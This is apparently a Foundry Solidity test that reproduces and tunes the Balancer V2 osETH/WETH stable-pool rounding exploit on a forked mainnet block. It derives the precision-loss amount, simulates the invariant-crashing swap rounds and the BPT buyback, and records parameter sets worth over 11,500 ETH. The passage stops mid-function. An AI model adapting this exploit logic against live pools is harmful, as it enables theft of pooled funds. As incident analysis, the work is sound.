// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/Console.sol";
import {IBasePool} from "src/interfaces/IBasePool.sol";
import {IVault} from "src/interfaces/IVault.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {FixedPoint} from "src/FixedPoint.sol";
import {SwapMath} from "src/SwapMath.sol";
import {StableMath} from "src/StableMath.sol";

contract SearchParams is Test {
    using FixedPoint for uint256;

    SwapMath internal swapMath;
    IBasePool constant OSETH_BPT = IBasePool(address(0xDACf5Fa19b1f720111609043ac67A9818262850c));
    IVault constant VAULT = IVault(address(0xBA12222222228d8Ba445958a75a0704d566BF2C8));

    uint256 internal amp;
    uint256 internal swapFeePercentage;
    uint256 internal protocolSwapFeePercentage; // protocol swap fee cache (50% = 5e17)
    uint256[] internal sf; // scaling factors for [WETH, osETH]

    function setUp() public {
        vm.createSelectFork("ETH", 23717396);
        vm.warp(1762156007); // block 23717397's timestamp, so rate provider returns the same rate as the real attack
        swapMath = new SwapMath();

        // Fetch pool parameters
        (amp,,) = OSETH_BPT.getAmplificationParameter();
        swapFeePercentage = OSETH_BPT.getSwapFeePercentage();
        protocolSwapFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(0); // SWAP = type 0

        // Update rate caches
        address[] memory rateProviders = OSETH_BPT.getRateProviders();
        IERC20[] memory tokens;
        (tokens,,) = VAULT.getPoolTokens(OSETH_BPT.getPoolId());
        for (uint256 i = 0; i < rateProviders.length; i++) {
            if (rateProviders[i] != address(0)) {
                OSETH_BPT.updateTokenRateCache(tokens[i]);
            }
        }

        // Get scaling factors for WETH (index 0) and osETH (index 2)
        uint256[] memory allSF = OSETH_BPT.getScalingFactors();
        sf = new uint256[](2);
        sf[0] = allSF[0]; // WETH
        sf[1] = allSF[2]; // osETH
    }

    /// @notice Try a single swap. Reverts if it triggers BAL#004 or any math error.
    function trySwap(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 indexIn,
        uint256 indexOut,
        uint256 swapOutAmount
    ) external view returns (uint256 newBalWETH, uint256 newBalOSETH) {
        uint256[] memory bal = new uint256[](2);
        uint256[] memory scalingFactors = new uint256[](2);
        bal[0] = balWETH;
        bal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        bal = swapMath.getAfterSwapOutBalances(bal, scalingFactors, indexIn, indexOut, swapOutAmount, amp, swapFeePercentage);
        return (bal[0], bal[1]);
    }

    /// @notice Like trySwap but also returns the post-swap invariant (for invariant threading)
    function trySwapWithInvariant(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 indexIn,
        uint256 indexOut,
        uint256 swapOutAmount
    ) external view returns (uint256 newBalWETH, uint256 newBalOSETH, uint256 postInvariant) {
        uint256[] memory bal = new uint256[](2);
        uint256[] memory scalingFactors = new uint256[](2);
        bal[0] = balWETH;
        bal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        (bal, postInvariant) = swapMath.getAfterSwapOutBalancesAndPostInvariant(bal, scalingFactors, indexIn, indexOut, swapOutAmount, amp, swapFeePercentage);
        return (bal[0], bal[1], postInvariant);
    }

    /// @notice Truncate to keep only the 2 most significant digits.
    /// e.g. 324816 -> 320000, 67123 -> 67000, 1234 -> 1200
    /// Formula: floor(x / 10^(d-2)) * 10^(d-2), where d = number of digits.
    function _truncateToTop2Digits(uint256 x) internal pure returns (uint256) {
        if (x < 100) return x; // 1-2 digit numbers: no truncation needed
        uint256 power = 1;
        uint256 temp = x;
        while (temp >= 100) {
            temp /= 10;
            power *= 10;
        }
        // power = 10^(d-2), temp = first 2 digits
        return temp * power;
    }

    /// @notice Compute Swap 3 extraction amount using the attacker's actual method
    /// (confirmed by BlockSec analysis):
    /// 1. Truncate WETH balance to top 2 significant digits (e.g. 324816 → 320000)
    /// 2. If swap fails (Newton-Raphson divergence), retry with 9/10 fallback (up to 2 retries)
    /// Returns (swapOut3, newBalWETH, newBalOSETH). Reverts if all 3 attempts fail.
    function _computeSwap3(uint256 balWETH, uint256 balOSETH) external returns (uint256, uint256, uint256) {
        uint256 swapOut3 = _truncateToTop2Digits(balWETH);
        // parameters [950 / 1000, 66000,  30] make total profit 11514 ETH
        // parameters [850 / 1000, 94000,  30] make total profit 11560 ETH
        // parameters [920 / 1000, 100000, 30] make total profit 11572 ETH
        // parameters [920 / 1000, 238000, 30] make total profit 11660 ETH
        // uint256 swapOut3 = balWETH * 999 / 1000;

        // Attempt 1: truncated amount
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        //console.log("Attempt 2: 9/10 fallback");
        // Attempt 2: 9/10 fallback
        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        //console.log("Attempt 3: 9/10 of 9/10 fallback");
        // Attempt 3: 9/10 of 9/10 fallback
        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        revert("Swap 3 failed after 3 attempts");
    }

    /// @notice Like _computeSwap3 but also returns the post-swap invariant
    function _computeSwap3WithInvariant(uint256 balWETH, uint256 balOSETH) external returns (uint256, uint256, uint256, uint256) {
        uint256 swapOut3 = _truncateToTop2Digits(balWETH);

        try this.trySwapWithInvariant(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o, uint256 inv) {
            return (swapOut3, w, o, inv);
        } catch {}

        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwapWithInvariant(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o, uint256 inv) {
            return (swapOut3, w, o, inv);
        } catch {}

        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwapWithInvariant(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o, uint256 inv) {
            return (swapOut3, w, o, inv);
        } catch {}

        revert("Swap 3 (inv) failed after 3 attempts");
    }

    /// @notice Simulate one D-crash round (3 swaps). Reverts if any swap fails.
    /// Called via this.simulateOneRound() so try/catch can intercept reverts.
    /// Swap 3 uses binary search to find maximum extractable WETH.
    function simulateOneRound(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 trickAmt
    ) external returns (uint256 newBalWETH, uint256 newBalOSETH) {
        uint256[] memory currentBal = new uint256[](2);
        uint256[] memory tempBal;
        uint256[] memory scalingFactors = new uint256[](2);

        // Swap 1: drain osETH to trickAmt + 1
        currentBal[0] = balWETH;
        currentBal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        uint256 swapOut1 = currentBal[1] - trickAmt - 1;
        tempBal = swapMath.getAfterSwapOutBalances(currentBal, scalingFactors, 0, 1, swapOut1, amp, swapFeePercentage);

        // Swap 2: drain remaining trickAmt from osETH (triggers precision loss)
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        tempBal = swapMath.getAfterSwapOutBalances(tempBal, scalingFactors, 0, 1, trickAmt, amp, swapFeePercentage);

        // Swap 3: truncation + 9/10 retry (like the real attacker's method)
        try this._computeSwap3(tempBal[0], tempBal[1]) returns (uint256 swapOut3, uint256 w, uint256 o) {
            return (w, o);
        } catch {revert("Swap 3 failed");}
    }

    /// @notice Like simulateOneRound but also returns the stored invariant after the last swap
    function simulateOneRoundWithInvariant(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 trickAmt
    ) external returns (uint256 newBalWETH, uint256 newBalOSETH, uint256 postRoundInvariant) {
        uint256[] memory currentBal = new uint256[](2);
        uint256[] memory tempBal;
        uint256[] memory scalingFactors = new uint256[](2);

        // Swap 1: drain osETH to trickAmt + 1
        currentBal[0] = balWETH;
        currentBal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        uint256 swapOut1 = currentBal[1] - trickAmt - 1;
        tempBal = swapMath.getAfterSwapOutBalances(currentBal, scalingFactors, 0, 1, swapOut1, amp, swapFeePercentage);

        // Swap 2: drain remaining trickAmt from osETH (triggers precision loss)
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        tempBal = swapMath.getAfterSwapOutBalances(tempBal, scalingFactors, 0, 1, trickAmt, amp, swapFeePercentage);

        // Swap 3: truncation + 9/10 retry — returns invariant
        try this._computeSwap3WithInvariant(tempBal[0], tempBal[1]) returns (uint256, uint256 w, uint256 o, uint256 inv) {
            return (w, o, inv);
        } catch {revert("Swap 3 (inv) failed");}
    }

    /// @notice Swap 3 using 999/1000 method instead of truncation
    function _computeSwap3_999(uint256 balWETH, uint256 balOSETH) external returns (uint256, uint256, uint256) {
        uint256 swapOut3 = balWETH * 999 / 1000;

        // Attempt 1
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        // Attempt 2: 9/10 fallback
        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        // Attempt 3: 9/10 of 9/10 fallback
        swapOut3 = swapOut3 * 9 / 10;
        try this.trySwap(balWETH, balOSETH, 1, 0, swapOut3) returns (uint256 w, uint256 o) {
            return (swapOut3, w, o);
        } catch {}

        revert("Swap 3 (999) failed after 3 attempts");
    }

    /// @notice Simulate one round using 999/1000 method for Swap 3
    function simulateOneRound_999(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 trickAmt
    ) external returns (uint256 newBalWETH, uint256 newBalOSETH) {
        uint256[] memory currentBal = new uint256[](2);
        uint256[] memory tempBal;
        uint256[] memory scalingFactors = new uint256[](2);

        currentBal[0] = balWETH;
        currentBal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        uint256 swapOut1 = currentBal[1] - trickAmt - 1;
        tempBal = swapMath.getAfterSwapOutBalances(currentBal, scalingFactors, 0, 1, swapOut1, amp, swapFeePercentage);

        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        tempBal = swapMath.getAfterSwapOutBalances(tempBal, scalingFactors, 0, 1, trickAmt, amp, swapFeePercentage);

        try this._computeSwap3_999(tempBal[0], tempBal[1]) returns (uint256, uint256 w, uint256 o) {
            return (w, o);
        } catch { revert("Swap 3 (999) failed"); }
    }

    /// @notice Compare truncation vs 999/1000 for Swap 3 extraction
    function test_compareSwap3Methods() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        uint256 N = 30;
        uint256 remain = 67000;

        console.log("=== COMPARE SWAP 3 METHODS: truncation vs 999/1000 ===");
        console.log("remain:", remain, "N:", N);

        // --- Method 1: Truncation (real attacker) ---
        uint256 bW1 = remain; uint256 bO1 = remain;
        uint256 d_initial = _getInvariant(bW1, bO1);
        console.log("D_initial:", d_initial);

        console.log("--- Truncation method (per-round) ---");
        for (uint256 r = 0; r < N; r++) {
            (bW1, bO1) = this.simulateOneRound(bW1, bO1, trickAmt);
            if (r < 5 || r >= N - 3) {
                console.log("Round:", r);
                console.log("WETH:", bW1);
                console.log("osETH:", bO1);
                console.log("    D=", _getInvariant(bW1, bO1));
            }
        }
        uint256 d_trunc = _getInvariant(bW1, bO1);
        console.log("Truncation final: WETH=", bW1, "osETH=", bO1);
        console.log("D=", d_trunc);

        // --- Method 2: 999/1000 ---
        uint256 bW2 = remain; uint256 bO2 = remain;

        console.log("--- 999/1000 method (per-round) ---");
        uint256 roundsOk = 0;
        for (uint256 r = 0; r < N; r++) {
            try this.simulateOneRound_999(bW2, bO2, trickAmt) returns (uint256 w, uint256 o) {
                bW2 = w; bO2 = o;
                roundsOk++;
                if (r < 5 || r >= N - 3) {
                    console.log("Round:", r);
                    console.log("WETH:", bW2);
                    console.log("osETH:", bO2);
                    console.log("    D=", _getInvariant(bW2, bO2));
                }
            } catch {
                console.log("  Round", r, ": REVERTED");
                break;
            }
        }
        uint256 d_999 = _getInvariant(bW2, bO2);
        console.log("999/1000 final: WETH=", bW2, "osETH=", bO2);
        console.log("D=", d_999);
        console.log("999/1000 rounds completed:", roundsOk);

        // --- Summary ---
        console.log("=== SUMMARY ===");
        console.log("D_initial:", d_initial);
        console.log("D_trunc:", d_trunc, "deflation_bps:", (d_initial - d_trunc) * 10000 / d_initial);
        if (roundsOk > 0) {
            console.log("D_999:", d_999, "deflation_bps:", (d_initial - d_999) * 10000 / d_initial);
        }
        uint256 cost_trunc = 2 * remain - (bW1 + bO1);
        uint256 cost_999 = 2 * remain - (bW2 + bO2);
        console.log("Cycling cost (truncation):", cost_trunc);
        console.log("Cycling cost (999/1000):", cost_999);
    }

    /// @notice Derive trickAmt analytically: trickAmt = floor(1e18 / (sf - 1e18))
    /// This is the maximum x such that mulDown(x, sf) == x (total precision loss).
    function test_deriveTrickAmt() public view {
        console.log("=== ANALYTICAL: trickAmt = floor(1e18 / (sf_osETH - 1e18)) ===");
        console.log("sf[WETH]:", sf[0]);
        console.log("sf[osETH]:", sf[1]);

        uint256 delta = sf[1] - FixedPoint.ONE;
        uint256 trickAmt = FixedPoint.ONE / delta;

        console.log("delta (sf - 1e18):", delta);
        console.log("trickAmt:", trickAmt);

        // Verify: mulDown(trickAmt, sf) == trickAmt
        uint256 upscaled = trickAmt * sf[1] / FixedPoint.ONE;
        uint256 upscaledNext = (trickAmt + 1) * sf[1] / FixedPoint.ONE;
        console.log("mulDown(trickAmt, sf):", upscaled, "== trickAmt?", upscaled == trickAmt);
        console.log("mulDown(trickAmt+1, sf):", upscaledNext, "== trickAmt+1?", upscaledNext == trickAmt + 1);

        require(upscaled == trickAmt, "trickAmt precision loss must hold");
        require(upscaledNext > trickAmt + 1, "trickAmt+1 must break precision loss");
    }

    /// @notice Helper: compute invariant D for given balances (already in internal representation)
    function _getInvariant(uint256 balWETH, uint256 balOSETH) internal view returns (uint256) {
        uint256[] memory bal = new uint256[](2);
        uint256[] memory scalingFactors = new uint256[](2);
        bal[0] = balWETH;
        bal[1] = balOSETH;
        scalingFactors[0] = sf[0];
        scalingFactors[1] = sf[1];
        return swapMath.calculateInvariant(amp, bal, scalingFactors);
    }
    /// @notice Generate Step 3 BPT purchase schedule using 1000x geometric series.
    ///
    /// Principle: after D crashes, BPT is nearly free. The attacker needs to buy back
    /// ~1e22 BPT spanning 18 orders of magnitude. A 1000x geometric series covers this
    /// range in just 7 steps (1e4 → 1e7 → 1e10 → 1e13 → 1e16 → 1e19 → 1e22), which is
    /// the most gas-efficient approach. The remainder after the geometric steps is split
    /// into 2 equal parts. Total: 9 swaps, alternating WETH/osETH.
    ///
    /// This is the same deterministic algorithm used in the real attack transaction.
    function _generateStep3Amounts(uint256 totalTarget, uint256 maxLength)
        internal pure returns (uint256[] memory amounts, uint256 count)
    {
        amounts = new uint256[](maxLength);
        uint256 accumulated = 10000;
        uint256 nowValue = 10000;
        amounts[0] = 10000;
        count = 1;

        for (uint256 i = 1; i < maxLength; i++) {
            if (totalTarget > accumulated + 1000 * nowValue) {
                accumulated += 1000 * nowValue;
                nowValue = nowValue * 1000;
                amounts[i] = nowValue;
                count++;
            } else {
                uint256 rem = totalTarget - nowValue;
                amounts[i] = rem / 2 + 1;
                amounts[i + 1] = rem / 2 + 1;
                count += 2;
                break;
            }
        }
    }

    /// @notice Simulate Step 3: buy back BPT using alternating WETH/osETH swaps,
    /// matching ComposableStablePool's _onJoinSwap logic with dynamic D recovery.
    ///
    /// Each swap is processed sequentially: compute token cost via StableMath, update
    /// pool balances (full amountIn including fee), and increase virtualSupply.
    /// This mirrors the Vault's sequential batchSwap processing.
    function _simulateStep3Repayment(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 bptToBuy,
        uint256 virtualSupply,
        uint256 initialStoredInvariant
    ) internal view returns (uint256 totalCost) {
        (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);

        uint256 bW = balWETH;
        uint256 bO = balOSETH;
        uint256 supply = virtualSupply;
        // Track stored invariant for between-swap protocol fees.
        // Use the post-Phase2 stored invariant (threaded from cycling's last swap).
        uint256 storedInvariant = initialStoredInvariant;
        for (uint256 i = 0; i < swapCount; i++) {
            uint256 preInvariant = _getInvariant(bW, bO);

            // Between-swap fee: _payProtocolFeesBeforeJoinExit mints BPT if
            // fresh invariant exceeds stored invariant from the previous swap.
            supply += _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);

            uint256 preSupply = supply;

            uint256[] memory bal = new uint256[](2);
            uint256[] memory scalingFactors = new uint256[](2);
            bal[0] = bW;
            bal[1] = bO;
            scalingFactors[0] = sf[0];
            scalingFactors[1] = sf[1];

            uint256 tokenIndex = i % 2 == 0 ? 0 : 1;

            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(
                bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage
            );

            if (tokenIndex == 0) {
                bW += amountIn;
            } else {
                bO += amountIn;
            }
            supply += bptAmounts[i];
            totalCost += amountIn;

            // After-swap fee: _updateInvariantAfterJoinExit
            supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
            // Store the post-swap invariant for the next between-swap check
            storedInvariant = postInv;
        }
    }


    /// @notice Debug version of _simulateStep3Repayment with per-swap logging
    function _simulateStep3RepaymentDebug(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 bptToBuy,
        uint256 virtualSupply,
        uint256 initialStoredInvariant
    ) internal returns (uint256 totalCost) {
        (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);

        uint256 bW = balWETH;
        uint256 bO = balOSETH;
        uint256 supply = virtualSupply;

        console.log("Step3 swapCount:", swapCount);
        uint256 totalBpt = 0;
        for (uint256 i = 0; i < swapCount; i++) {
            totalBpt += bptAmounts[i];
        }
        console.log("Step3 totalBpt:", totalBpt);

        uint256 storedInvariant = initialStoredInvariant;
        for (uint256 i = 0; i < swapCount; i++) {
            uint256 preInvariant = _getInvariant(bW, bO);

            // Between-swap fee
            uint256 beforeFee = _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
            supply += beforeFee;

            uint256 preSupply = supply;

            uint256[] memory bal = new uint256[](2);
            uint256[] memory scalingFactors = new uint256[](2);
            bal[0] = bW;
            bal[1] = bO;
            scalingFactors[0] = sf[0];
            scalingFactors[1] = sf[1];

            uint256 tokenIndex = i % 2 == 0 ? 0 : 1;

            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(
                bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage
            );

            console.log("  Swap", i);
            console.log("    token:", tokenIndex == 0 ? "WETH" : "osETH");
            console.log("    bptOut:", bptAmounts[i]);
            console.log("    tokenIn:", amountIn);
            console.log("    supply_before:", supply);
            console.log("    balW:", bW, "balO:", bO);
            if (beforeFee > 0) {
                console.log("    beforeSwapFeeBpt:", beforeFee);
            }

            if (tokenIndex == 0) {
                bW += amountIn;
            } else {
                bO += amountIn;
            }
            supply += bptAmounts[i];
            totalCost += amountIn;

            // After-swap fee
            uint256 protocolBpt = _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
            if (protocolBpt > 0) {
                console.log("    protocolBptMinted:", protocolBpt);
            }
            supply += protocolBpt;
            storedInvariant = postInv;
        }
    }

    /// @notice Generate Step 1 token extraction amounts using the real attack's geometric decay:
    /// each step takes (remaining - target) * 99 / 100 of the token.
    function _generateStep1Amounts(uint256 balance, uint256 targetRemain, uint256 maxLength)
        internal pure returns (uint256[] memory amounts, uint256 count)
    {
        amounts = new uint256[](maxLength);
        uint256 preAmount = 0;
        uint256 sumAmount = 0;
        count = 0;

        for (uint256 i = 0; i < maxLength; i++) {
            uint256 amount;
            if (preAmount == 0) {
                preAmount = 99 * balance - 99 * targetRemain;
            } else {
                preAmount = preAmount - 99 * (preAmount / 100);
            }
            amount = preAmount / 100;
            uint256 nextAmount = preAmount - 99 * (preAmount / 100);
            if (nextAmount < 100) {
                amount = balance - sumAmount - targetRemain;
                amounts[i] = amount;
                count++;
                break;
            } else {
                sumAmount += amount;
                amounts[i] = amount;
                count++;
            }
        }
    }

    /// @notice Simulate Step 1: drain pool from real balances to targetRemain using GIVEN_OUT
    /// BPT→token swaps. Uses the geometric decay schedule (99/100 of excess each step),
    /// alternating between WETH and osETH exits.
    /// Returns (totalBptSold, totalTokensOut, remainingVirtualSupply).
    ///
    /// Key insight: virtualSupply = totalSupply - registeredBptBalance.
    /// During batchSwap, the Vault updates registered balances between swaps.
    /// Each exit sends BPT into the pool (registered BPT balance ↑), so virtualSupply ↓.
    /// After each exit, the pool calls _updateInvariantAfterJoinExit which mints protocol
    /// fee BPT when the swap fee causes the invariant to decrease less than proportionally
    /// to the supply decrease. This increases virtualSupply slightly after each swap.
    function _simulateStep1Extraction(
        uint256 realWETH,
        uint256 realOSETH,
        uint256 targetRemain,
        uint256 bptSupply
    ) internal view returns (uint256 totalBptSold, uint256 totalTokensOut, uint256 remainingSupply, uint256 lastPostJoinExitInvariant) {
        // Generate token extraction schedules (same pattern as real attack)
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(realWETH, targetRemain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(realOSETH, targetRemain, 15);

        uint256 bW = realWETH;
        uint256 bO = realOSETH;
        uint256 supply = bptSupply;

        // Use the fresh invariant from current balances for all steps.
        // The real Balancer _beforeJoinExit updates the stored invariant to freshInvariant
        // before the first swap, so step 0 uses freshInvariant as preJoinExitInvariant.
        // (The stored _lastPostJoinExitInvariant may reflect an older osETH rate and would
        //  be significantly lower than fresh, causing over-estimation of protocol fees.)

        // Interleave: alternate WETH and osETH exits (matching real attack's swap ordering)
        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        for (uint256 i = 0; i < maxSwaps; i++) {
            // WETH exit: BPT → WETH (GIVEN_OUT, amount = token output desired)
            if (i < wethCount) {
                uint256 preInvariant = _getInvariant(bW, bO);
                uint256 preSupply = supply;

                uint256 tokenOut = wethAmounts[i];
                uint256[] memory bal = new uint256[](2);
                uint256[] memory scalingFactors = new uint256[](2);
                bal[0] = bW; bal[1] = bO;
                scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];

                uint256 bptIn = swapMath.getBptInForTokenOut(
                    bal, scalingFactors, 0, tokenOut, supply, amp, swapFeePercentage
                );
                uint256 postInv = _calcPostInvariant(bW, bO, 0, tokenOut, false);
                bW -= tokenOut;
                supply -= bptIn;
                totalBptSold += bptIn;
                totalTokensOut += tokenOut;

                // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
                supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
                // Track the stored invariant (mirrors _updatePostJoinExit)
                lastPostJoinExitInvariant = postInv;
            }
            // osETH exit: BPT → osETH (GIVEN_OUT)
            if (i < osethCount) {
                uint256 preInvariant = _getInvariant(bW, bO);
                uint256 preSupply = supply;

                uint256 tokenOut = osethAmounts[i];
                uint256[] memory bal = new uint256[](2);
                uint256[] memory scalingFactors = new uint256[](2);
                bal[0] = bW; bal[1] = bO;
                scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];

                uint256 bptIn = swapMath.getBptInForTokenOut(
                    bal, scalingFactors, 1, tokenOut, supply, amp, swapFeePercentage
                );
                uint256 postInv = _calcPostInvariant(bW, bO, 1, tokenOut, false);
                bO -= tokenOut;
                supply -= bptIn;
                totalBptSold += bptIn;
                totalTokensOut += tokenOut;

                // Protocol fee minting (mirrors _updateInvariantAfterJoinExit)
                supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
                // Track the stored invariant (mirrors _updatePostJoinExit)
                lastPostJoinExitInvariant = postInv;
            }
        }
        remainingSupply = supply;
    }

    /// @notice Compute post-swap invariant using Balancer's upscale-then-operate order.
    /// In the real contract, balances are upscaled BEFORE the token delta is applied.
    /// This avoids 1-wei rounding discrepancies from floor((a±b)*s/1e18) vs floor(a*s/1e18)±floor(b*s/1e18).
    function _calcPostInvariant(
        uint256 preBW,
        uint256 preBO,
        uint256 tokenIndex,
        uint256 tokenDelta,
        bool isJoin
    ) internal view returns (uint256) {
        uint256[] memory bal = new uint256[](2);
        bal[0] = preBW * sf[0] / FixedPoint.ONE;
        bal[1] = preBO * sf[1] / FixedPoint.ONE;
        uint256 scaledDelta = tokenDelta * sf[tokenIndex] / FixedPoint.ONE;
        if (isJoin) {
            bal[tokenIndex] += scaledDelta;
        } else {
            bal[tokenIndex] -= scaledDelta;
        }
        return StableMath._calculateInvariant(amp, bal);
    }

    /// @notice Calculate protocol fee BPT to mint after a join/exit swap.
    /// Mirrors Balancer V2's _updateInvariantAfterJoinExit logic:
    /// - feelessInvariant = preInvariant * postSupply / preSupply
    /// - If postInvariant > feelessInvariant, the excess is swap fee growth
    /// - Protocol gets protocolSwapFeePercentage of the growth, minted as BPT
    function _calcProtocolFeeBpt(
        uint256 preInvariant,
        uint256 preSupply,
        uint256 postInvariant,
        uint256 postSupply
    ) internal view returns (uint256) {

        // feelessInvariant = preInvariant * (postSupply / preSupply)
        // This is what D would be if the exit were proportional (no swap fee)
        uint256 supplyRatio = postSupply.divDown(preSupply);
        uint256 feelessInvariant = preInvariant.mulDown(supplyRatio);

        if (postInvariant <= feelessInvariant) return 0;

        // The excess invariant is the swap fee's contribution
        uint256 invariantDelta = postInvariant - feelessInvariant;

        // Real Balancer uses Math.divDown(Math.mul(delta, fee), postInvariant)
        // = (delta * fee) / postInvariant  (single rounding, no intermediate truncation)
        // NOT mulDown().divDown() which double-rounds and loses precision for small delta
        uint256 protocolOwnership = (invariantDelta * protocolSwapFeePercentage) / postInvariant;

        if (protocolOwnership == 0) return 0;

        // Real Balancer: ExternalFees.bptForPoolOwnershipPercentage uses
        // Math.divDown(Math.mul(supply, ownership), complement)
        // = (supply * ownership) / complement  (single rounding)
        return (postSupply * protocolOwnership) / protocolOwnership.complement();
    }

    /// @notice Calculate protocol fee BPT minted by _payProtocolFeesBeforeJoinExit between
    /// consecutive BPT swaps within the same transaction.
    /// Within a single tx (rates unchanged), the three growth invariants collapse to
    /// freshInvariant, so the formula simplifies to:
    ///   ownership = (freshInv - storedInv).divDown(freshInv).mulDown(protocolSwapFeePercentage)
    ///   feeBpt = supply * ownership / complement(ownership)
    function _calcBeforeSwapFeeBpt(
        uint256 freshInvariant,
        uint256 lastPostJoinExitInvariant,
        uint256 supply
    ) internal view returns (uint256) {
        if (freshInvariant <= lastPostJoinExitInvariant) return 0;
        uint256 delta = freshInvariant - lastPostJoinExitInvariant;
        // Matches _getProtocolPoolOwnershipPercentage: divDown then mulDown (two separate roundings)
        uint256 swapFeeFraction = delta * FixedPoint.ONE / freshInvariant; // divDown
        uint256 ownership = swapFeeFraction * protocolSwapFeePercentage / FixedPoint.ONE; // mulDown
        if (ownership == 0) return 0;
        // ExternalFees.bptForPoolOwnershipPercentage: Math.divDown(Math.mul(supply, ownership), complement)
        return (supply * ownership) / ownership.complement();
    }

    /// @notice Calculate BPT that the real Balancer contract mints as yield fees before the
    /// first swap of a batchSwap batch.
    /// Mirrors ComposableStablePool._payProtocolFeesBeforeJoinExit:
    ///   yieldOwnership = (freshInvariant - storedInvariant) / freshInvariant * yieldFeePercentage
    ///   yieldFeeBpt = supply * yieldOwnership / (1 - yieldOwnership)
    function _calcYieldFeeBpt(
        uint256 freshInvariant,
        uint256 storedInvariant,
        uint256 supply
    ) internal view returns (uint256) {
        if (freshInvariant <= storedInvariant) return 0;
        // protocolYieldFeePercentage is at cache type 2 (YIELD) per IBasePool.sol comment
        uint256 yieldFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(2);
        if (yieldFeePercentage == 0) return 0;
        uint256 delta = freshInvariant - storedInvariant;
        // fraction = delta / freshInvariant  (FixedPoint.divDown)
        // yieldOwnership = fraction * yieldFeePercentage  (FixedPoint.mulDown)
        uint256 yieldOwnership = (delta * FixedPoint.ONE / freshInvariant) * yieldFeePercentage / FixedPoint.ONE;
        if (yieldOwnership == 0) return 0;
        // bptForPoolOwnershipPercentage: supply * ownership / complement
        return (supply * yieldOwnership) / yieldOwnership.complement();
    }

    /// @notice Helper: compute profit for a given remain value using high-fidelity simulation.
    /// Chains virtualSupply from Step 1 → Step 3 for accurate pricing.
    /// Phase 2 (token↔token swaps) does NOT update _lastPostJoinExitInvariant in the real contract,
    /// so Phase 3 sees the invariant stored after Phase 1's last exit.
    function _computeProfit(
        uint256 remain,
        uint256 wAfter,
        uint256 oAfter,
        uint256 realWETH,
        uint256 realOSETH,
        uint256 totalBPT
    ) internal view returns (uint256) {
        (uint256 bptSold, uint256 tokensExtracted, uint256 postStep1Supply, uint256 phase1Invariant) =
            _simulateStep1Extraction(realWETH, realOSETH, remain, totalBPT);
        uint256 sumAfter = wAfter + oAfter;
        // The pool loses (2*remain - sumAfter) tokens during cycling, which flow to the attacker.
        // This is a GAIN for the attacker, not a cost.
        uint256 cyclingGain = sumAfter < 2 * remain ? 2 * remain - sumAfter : 0;
        // Step 2 (cycling) doesn't involve BPT, so virtualSupply stays at postStep1Supply
        // Use the real attack's bptTarget = actualSupply * 10030 / 10000 (not bptSold)
        uint256 bptTarget = totalBPT * 10030 / 10000;
        // Phase 2 token↔token swaps don't update storedInvariant, so Phase 3 uses Phase 1's last postInv
        uint256 repaymentCost = _simulateStep3Repayment(wAfter, oAfter, bptTarget, postStep1Supply, phase1Invariant);
        if (tokensExtracted + cyclingGain < repaymentCost) return 0; // net loss
